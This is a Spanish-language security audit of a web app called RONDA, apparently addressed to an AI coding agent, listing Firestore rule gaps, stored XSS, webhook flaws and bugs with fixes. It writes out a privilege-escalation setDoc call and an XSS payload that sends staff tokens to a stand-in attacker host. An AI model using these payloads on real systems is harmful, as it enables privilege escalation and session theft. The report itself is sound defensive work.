# 🛡️ AUDITORÍA INTEGRAL DE SEGURIDAD, ANÁLISIS DE VULNERABILIDADES, CÓDIGO DUPLICADO Y BUGS (RONDA)

> **Destinatario:** Cline (VS Code Agent / Ejecutor Autónomo) & Antigravity (Arquitecto)  
> **Fecha de Emisión:** 26 de Octubre de 2026  
> **Nivel de Severidad General:** 🔴 CRÍTICO / ALTO EN 3 VECTORES DE DATOS Y PRIVILEGIOS  
> **Objetivo:** Documentar exhaustivamente cada vulnerabilidad de seguridad, fallo en reglas de base de datos, vectores de inyección XSS, colisiones de permisos, duplicación de código y bugs de runtime encontrados en la base de código de RONDA, proporcionando el plan paso a paso para que **Cline** ejecute las correcciones sin romper tests ni introducir costos de infraestructura ($0).

---

## 1. 🚨 MATRIZ DE VULNERABILIDADES DE SEGURIDAD

### 🔴 Hallazgo S-1: Escalada de Privilegios y Bypass Total de Pago / KYC en `firestore.rules` (Alta de Usuario)
- **Severidad:** 🔴 CRÍTICA
- **Ubicación:** [`firestore.rules:44-46`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/firestore.rules#L44-L46)
- **Código Vulnerable:**
  ```javascript
  // Alta: solo el propio usuario, y SIEMPRE con rol 'client' (sin auto-elevación).
  allow create: if request.auth != null
                && request.auth.uid == userId
                && request.resource.data.role == 'client';
  ```
- **Mecánica del Ataque:**
  - La regla `allow create` **únicamente** comprueba que `request.resource.data.role == 'client'`.
  - La función `clientTouchedSensitive()` (que restringe `trustTier`, `verifications`, `nfts`, `wallet_address`, `matches`) solo está activa en `allow update` (línea 54), **NO en `allow create`**.
  - Tampoco se comprueba `hasTicket`.
  - **Vector de Explotación:** Cualquier usuario al registrarse puede enviar a través del SDK de Firebase en consola del navegador:
    ```javascript
    setDoc(doc(db, 'users', auth.currentUser.uid), {
      name: "Atacante",
      role: "client",
      hasTicket: true,          // <-- TICKET GRATIS A CUALQUIER EVENTO
      trustTier: 2,             // <-- VERIFICACIÓN TIER 2 SIN KYC
      isVerified: true,         // <-- STATUS VERIFICADO
      nfts: ["fake_nft_id"],
      matches: ["target_uid_1", "target_uid_2"] // <-- MATCHES FORZADOS
    });
    ```
- **Remediación Inmediata (Cline):**
  Modificar la regla `allow create` en [`firestore.rules`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/firestore.rules) para blindar todos los campos sensibles desde el instante de creación:
  ```javascript
  allow create: if request.auth != null
                && request.auth.uid == userId
                && request.resource.data.role == 'client'
                && request.resource.data.get('hasTicket', false) == false
                && request.resource.data.get('trustTier', 0) == 0
                && request.resource.data.get('isVerified', false) == false
                && !request.resource.data.keys().hasAny([
                  'nfts', 'wallet_address', 'matches', 'verifications'
                ]);
  ```

---

### 🔴 Hallazgo S-2: Bloqueo Total por Omisión en `firestore.rules` de la Colección `kycReviews`
- **Severidad:** 🔴 CRÍTICA (Fallo Operativo y de Disponibilidad)
- **Ubicación:** [`firestore.rules`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/firestore.rules) (Ausente) vs [`src/verification.ts:214`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/src/verification.ts#L214), [`src/kyc-review.ts:17`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/src/kyc-review.ts#L17) y [`src/superadmin.ts:337`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/src/superadmin.ts#L337).
- **Mecánica:**
  - En Firestore, cualquier colección no declarada explícitamente en `firestore.rules` tiene denegación por defecto (`deny all`).
  - Cuando el módulo de verificación facial detecta un caso borde o fallo de OCR e intenta encolar en `kycReviews`, la llamada lanza `FirebaseError: Missing or insufficient permissions` y falla silenciosamente en el catch.
  - El panel de SuperAdmin (`superadmin.ts`) tampoco puede consultar la cola de revisión manual.
- **Remediación Inmediata (Cline):**
  Agregar en [`firestore.rules`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/firestore.rules):
  ```javascript
  // --- Cola de Revisión Manual KYC ---
  match /kycReviews/{reviewId} {
    // Lectura: solo staff (superadmin / admin)
    allow read: if request.auth != null && isStaff();
    // Creación: el propio usuario autenticado registrando su caso borde
    allow create: if request.auth != null 
                  && request.resource.data.userId == request.auth.uid
                  && request.resource.data.status == 'pending';
    // Modificación / purga: solo staff
    allow update, delete: if isStaff();
  }
  ```

---

### 🔴 Hallazgo S-3: Colecciones B2B, Ledger y Tokens Bloqueadas en `firestore.rules`
- **Severidad:** 🔴 CRÍTICA
- **Ubicación:** [`firestore.rules`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/firestore.rules) (Ausentes) vs [`src/db.ts:720-840`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/src/db.ts#L720-L840) y [`src/superadmin.ts:1091`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/src/superadmin.ts#L1091).
- **Colecciones sin Reglas Declaradas:**
  - `scouts` (`DB.getScouts`, `DB.saveScout`)
  - `hosts` (`DB.getHosts`, `DB.saveHost`)
  - `commission_ledger` (`DB.getLedgerEntries`, `DB.saveLedgerEntry`)
  - `payouts` (`DB.getPayouts`, `DB.savePayout`)
  - `audit_logs` (`DB.logAudit`)
  - `host_offers` (`DB.getHostOffers`, `DB.saveHostOffer`)
  - `churn_surveys` (`DB.deleteUserAccount`)
  - `invest_tokens` (`SuperAdmin.renderTokens`)
- **Remediación Inmediata (Cline):**
  Definir las reglas de acceso en [`firestore.rules`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/firestore.rules):
  - `scouts` y `hosts`: lectura para staff o el propio scout/host; escritura para `isSuperAdmin() || isSales()`.
  - `commission_ledger` y `payouts`: lectura para el payee correspondiente (`request.auth.uid == resource.data.payee_uid`) o staff; escritura únicamente `isSuperAdmin()`.
  - `audit_logs`: creación para cualquier usuario autenticado registrando eventos de auditoría propios; lectura únicamente `isSuperAdmin()`.
  - `host_offers`: lectura para el host invitado o staff; escritura `isSuperAdmin() || isSales()`.
  - `churn_surveys`: creación pública para usuarios autenticados al suprimir cuenta; lectura solo `isSuperAdmin()`.
  - `invest_tokens`: lectura pública o staff; escritura solo `isSuperAdmin()`.

---

### 🟠 Hallazgo S-4: Inyección XSS Persistente (Stored XSS) en CRM y Consolas Staff
- **Severidad:** 🟠 ALTA
- **Ubicación:**
  1. [`src/crm.ts:230-248`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/src/crm.ts#L230-L248): `card.innerHTML` interpola `lead.name`, `lead.zone`, `lead.contactName` y `lead.phone`.
  2. [`src/profile.ts:114`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/src/profile.ts#L114): `profileMeta.innerHTML` interpola `cocktail`, `zone`, `zodiac`.
  3. [`src/bar.ts:590`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/src/bar.ts#L590): `el.innerHTML` interpola `p.name || uid`.
  4. [`src/notifications.ts:125-126`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/src/notifications.ts#L125-L126): `this.list.innerHTML` interpola `n.title` y `n.body`.
- **Mecánica del Ataque:**
  - El formulario público B2B en `partners.html` (`#partner-lead-form`) permite a cualquier visitante de internet registrar un lead.
  - Si el atacante introduce:
    ```html
    <img src=x onerror="fetch('https://attacker.site/steal?token='+window.Auth.currentUser.accessToken)">
    ```
    como nombre del local o nombre de contacto, dicho payload se guarda en Firestore (`leads`).
  - Cuando el equipo comercial o el superadmin ingresa a `crm.html`, el payload se inserta directamente en el DOM mediante `innerHTML`. El script malicioso se ejecuta con los privilegios del staff.
- **Remediación Inmediata (Cline):**
  Exportar y utilizar transversalmente una función `escapeHtml` desde un módulo utilitario común (`src/dialog.ts` o un nuevo `src/utils.ts`):
  ```typescript
  export function escapeHtml(str: string | null | undefined): string {
    if (!str) return '';
    return String(str)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#39;');
  }
  ```
  Reemplazar todas las interpolaciones vulnerables en `crm.ts`, `profile.ts`, `bar.ts` y `notifications.ts`.

---

### 🟠 Hallazgo S-5: Falta de Validación de Firma en Webhook de WhatsApp y Token Hardcodeado
- **Severidad:** 🟠 ALTA
- **Ubicación:** [`functions-vercel/api/whatsapp-webhook.js:13, 28-36`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/functions-vercel/api/whatsapp-webhook.js#L13)
- **Código Vulnerable:**
  ```javascript
  const verifyToken = process.env.WHATSAPP_VERIFY_TOKEN || 'ronda_webhook_secret_2026';
  ...
  if (req.method === 'POST') {
    const body = req.body;
    if (!body || body.object !== 'whatsapp_business_account') ...
    // NO HAY VERIFICACIÓN DE X-Hub-Signature-256
  ```
- **Mecánica:**
  - En peticiones POST entrantes, Meta firma el payload con HMAC-SHA256 en la cabecera `X-Hub-Signature-256`.
  - La función en Vercel omite por completo esta verificación.
  - Cualquier actor externo puede enviar peticiones HTTP POST falsas simulando mensajes de WhatsApp e inyectar registros en la base de datos `whatsapp_inbound`.
- **Remediación Inmediata (Cline):**
  - Eliminar el fallback inseguro `'ronda_webhook_secret_2026'`. Si no hay variable de entorno, fallar cerrado (500).
  - En el handler POST, calcular el HMAC-SHA256 del raw body usando `process.env.WHATSAPP_APP_SECRET` y comparar con `req.headers['x-hub-signature-256']`.

---

### 🟡 Hallazgo S-6: Transacciones Rechazadas o Expiradas de Wompi Dejan `paymentPending` Bloqueado
- **Severidad:** 🟡 MEDIA
- **Ubicación:** [`functions-vercel/api/wompi-webhook.js:57-109`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/functions-vercel/api/wompi-webhook.js#L57-L109)
- **Mecánica:**
  - El webhook solo maneja `if (status === 'APPROVED')`.
  - Si la transacción es `DECLINED`, `VOIDED` o `ERROR`, no se ejecuta ninguna acción sobre el usuario.
  - El usuario queda con `paymentPending: true` en su perfil de Firestore, impidiéndole generar nuevas órdenes o reintentar el pago de forma limpia.
- **Remediación Inmediata (Cline):**
  Añadir el manejo de fallos para desbloquear la sesión de compra:
  ```javascript
  else if (['DECLINED', 'VOIDED', 'ERROR'].includes(status)) {
    await db.collection('users').doc(uid).update({
      paymentPending: false,
      lastPaymentError: status
    });
  }
  ```

---

### 🟡 Hallazgo S-7: Creación Irrestricta de Chats Efímeros sin Match Mutuo
- **Severidad:** 🟡 MEDIA
- **Ubicación:** [`firestore.rules:105-110`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/firestore.rules#L105-L110)
- **Mecánica:**
  - La regla permite crear documentos en `/chats/{chatId}` si el usuario está en `participants` y no ha expirado.
  - No valida que los participantes tengan un match mutuo confirmado en sus perfiles (`users/{uid}/matches`).
  - Un usuario malicioso podría abrir conversaciones con personas que no hicieron match o no asistieron al evento.
- **Remediación Inmediata (Cline):**
  Verificar que `request.auth.uid` y el otro participante tengan coincidencia en Firestore o restringir la creación de chats exclusivamente al backend/staff (`isStaff()`).

---

## 2. 🔄 CÓDIGO DUPLICADO Y REDUNDANCIAS ARQUITECTÓNICAS

| Componente | Archivo 1 | Archivo 2 / 3 | Problema Detectado | Acción para Cline |
| :--- | :--- | :--- | :--- | :--- |
| **Estilos Globales de Tokens** | [`assets/ronda-tokens.css`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/assets/ronda-tokens.css) | [`public/assets/ronda-tokens.css`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/public/assets/ronda-tokens.css) | Duplicación exacta de 4.3 KB. Al editar uno, el otro queda desincronizado. | Unificar mediante script de copia en `scripts/sync-version.cjs` o mantener `public/assets/` como única SSoT servida por Vite. |
| **Componente RondaDialog** | [`assets/ronda-dialog.js`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/assets/ronda-dialog.js) | [`src/dialog.ts`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/src/dialog.ts) | Dos implementaciones paralelas del modal luxury (una en JS para HTML legacy y otra en TS compilada). | Exportar e incluir `dist/assets/ronda-dialog.js` generado automáticamente por el build o asegurar paridad en `scripts/build-prod.cjs`. |
| **Sanitización HTML** | [`src/dialog.ts:13`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/src/dialog.ts#L13) | Ausente en `crm.ts`, `profile.ts`, `bar.ts`, `notifications.ts` | Solo `dialog.ts` contiene `escapeHtml()`; el resto del código concatena strings raw. | Extraer `escapeHtml` a `src/utils.ts` y reutilizarla en todos los módulos. |
| **Lógica de Roles en Rules** | [`firestore.rules:10-14`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/firestore.rules#L10-L14) | Múltiples funciones | `isStaff()` evalúa 4 funciones que llaman independientemente a `userRole()`, disparando múltiples lecturas `get()`. | Agrupar en: `function isStaff() { let r = userRole(request.auth.uid); return r in ['superadmin', 'sales', 'network', 'admin']; }`. |

---

## 3. 🐛 BUGS DE RUNTIME, FUGAS Y CASOS BORDE

### 🐞 Bug B-1: Fuga de Event Listeners en `src/bar.ts` (`btnLogout`)
- **Ubicación:** [`src/bar.ts:488-493`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/src/bar.ts#L488-L493)
- **Detalle:** En `renderDashboard()`, los botones `btnStart`, `btnEnd`, `btnCapacity`, `btnMenu` se limpian mediante `cloneNode(true)`. Sin embargo, `btnLogout` agrega un nuevo `addEventListener('click')` cada vez que llega una actualización de Firestore en tiempo real. Tras 5 actualizaciones, pulsar "Cerrar Sesión" dispara 5 cierres de sesión concurrentes.
- **Fix:** Aplicar `cloneNode(true)` a `btnLogout` antes de vincular el evento.

### 🐞 Bug B-2: Mensajes de Error `[object Object]` en `src/api-client.ts`
- **Ubicación:** [`src/api-client.ts:48`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/src/api-client.ts#L48)
- **Detalle:** `throw new Error(responseData.error || responseData.message || ...);`  
  Dado que las funciones de Vercel devuelven `{ error: { message: "...", code: "..." } }`, `responseData.error` es un objeto, lo que provoca que `new Error(...)` muestre `[object Object]` en lugar del texto del error.
- **Fix:** Cambiar a `responseData.error?.message || responseData.error || responseData.message || ...`.

### 🐞 Bug B-3: Inconsistencia de Narrativa en `src/bar.ts` (2 Cócteles vs 1 Cóctel de Autor)
- **Ubicación:** [`src/bar.ts:435-442`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/src/bar.ts#L435-L442)
- **Detalle:** El anfitrión sigue viendo `${totalParticipants * 2} mínimo` y `totalRev = totalParticipants * 44000` ($22.000 × 2), contradiciendo el hito global de estandarización donde la entrada incluye únicamente **1 Cóctel de Autor** ($22.000 COP).
- **Fix:** Cambiar a `${totalParticipants} cóctel de autor incluido` y `totalRev = totalParticipants * 22000`.

### 🐞 Bug B-4: Elemento no Editable en `promptMenuNight` (`src/bar.ts`)
- **Ubicación:** [`src/bar.ts:545, 556-557`](file:///c:/Users/Cesar%20Dla%20Croix/Desktop/ronda-app/src/bar.ts#L545)
- **Detalle:** `#menu-night-price` es un `<span>`, no un `<input>`. El anfitrión no puede modificar el precio en pantalla y la función re-guarda el mismo valor inicial.
- **Fix:** Convertir `#menu-night-price` en un input numérico estilizado `<input id="menu-night-price" type="number" value="${this.currentEvent.price ?? 45000}">` y leer su valor (`.value`).

---

## 4. 📋 PLAN DE ACCIÓN PARA CLINE (VS CODE AGENT)

Cline debe ejecutar las siguientes fases en orden secuencial:

### 🔹 Fase 1: Blindaje de `firestore.rules` (Prioridad P0)
1. **Regla S-1:** Corregir `allow create` en `/users/{userId}` para impedir auto-otorgamiento de `hasTicket`, `trustTier`, `isVerified` y arrays sensibles.
2. **Regla S-2:** Agregar la regla completa para `match /kycReviews/{reviewId}`.
3. **Regla S-3:** Declarar las reglas faltantes para `scouts`, `hosts`, `commission_ledger`, `payouts`, `audit_logs`, `host_offers`, `churn_surveys`, `invest_tokens`.
4. **Optimización S-Staff:** Optimizar la función `isStaff()` en una sola llamada a `userRole()`.
5. **Validar:** `node test/test-integrity-zero-functions.cjs`.

### 🔹 Fase 2: Sanitización XSS y Creación de `src/utils.ts` (Prioridad P1)
1. Crear `src/utils.ts` con la función `escapeHtml(str)`.
2. Sanitizar en `src/crm.ts` la generación de cards (`card.innerHTML`).
3. Sanitizar en `src/profile.ts` (`profileMeta.innerHTML`).
4. Sanitizar en `src/bar.ts` (`renderAttendeesList`).
5. Sanitizar en `src/notifications.ts` (`this.list.innerHTML`).
6. Validar: `npx tsc --noEmit`.

### 🔹 Fase 3: Reparación de Bugs en `src/bar.ts` y `src/api-client.ts` (Prioridad P1)
1. **B-1:** Clonar `btnLogout` en `src/bar.ts` antes de vincular listener.
2. **B-2:** Corregir parsing de errores en `src/api-client.ts:48`.
3. **B-3:** Corregir cálculo de consumiciones e ingresos en `src/bar.ts:435-442` (1 cóctel de autor = $22.000 COP).
4. **B-4:** Convertir `#menu-night-price` en un `<input type="number">` funcional en `src/bar.ts`.
5. Validar: `npx tsc --noEmit`.

### 🔹 Fase 4: Blindaje de Webhooks en Backend Serverless (Prioridad P2)
1. En `functions-vercel/api/whatsapp-webhook.js`:
   - Eliminar el fallback hardcodeado de token.
   - Implementar verificación HMAC con `X-Hub-Signature-256`.
2. En `functions-vercel/api/wompi-webhook.js`:
   - Gestionar estados `DECLINED`/`ERROR` para limpiar `paymentPending: false`.

### 🔹 Fase 5: Validación Técnica Total
1. `node test/test-integrity-zero-functions.cjs` (5/5 OK).
2. `node test/test-face-verification-suite.cjs` (15/15 OK).
3. `npx tsc --noEmit` (0 errores).
4. `npm run build` (Build exitoso en `dist/`).
